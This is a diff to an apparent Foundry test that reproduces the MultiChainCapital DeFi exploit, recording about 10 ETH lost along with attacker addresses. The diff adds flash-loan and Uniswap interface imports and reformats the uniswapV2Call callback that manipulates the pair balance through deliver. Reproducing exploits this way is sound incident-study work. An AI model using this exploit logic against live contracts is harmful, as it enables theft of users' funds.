@@ -3,6 +3,12 @@ pragma solidity ^0.8.10;
 
 import "forge-std/Test.sol";
 
+import {IERC20Metadata as IERC20} from "src/interfaces/IERC20Metadata.sol";
+
+import {IAaveFlashloan} from "src/interfaces/IAaveFlashloan.sol";
+
+import {IUniswapV2Pair} from "src/interfaces/IUniswapV2Pair.sol";
+import {IUniswapV2Router} from "src/interfaces/IUniswapV2Router.sol";
 // @KeyInfo -- Total Lost : ~10 ETH
 // Attacker : https://etherscan.io/address/0x8a4571c3a618e00d04287ca6385b6b020ce7a305
 // Attack Contract : https://etherscan.io/address/0x52d74eb7c01c763219dce713da97ebae8b91728e
@@ -207,9 +213,15 @@ contract MultiChainCapitalExploit is Test {
         mcc.deliver((amount1000 * v0) / 1000);
     }
 
-    function uniswapV2Call(address, /*sender*/ uint256, /*amount0*/ uint256, /*amount1*/ bytes calldata /*data*/ )
-        external
-    {
+    function uniswapV2Call(
+        address,
+        /*sender*/
+        uint256,
+        /*amount0*/
+        uint256,
+        /*amount1*/
+        bytes calldata /*data*/
+    ) external {
         if (times > 5) {
             if (times <= 25) {
                 uint256 pairBalance = mcc.balanceOf(address(mcc_weth));
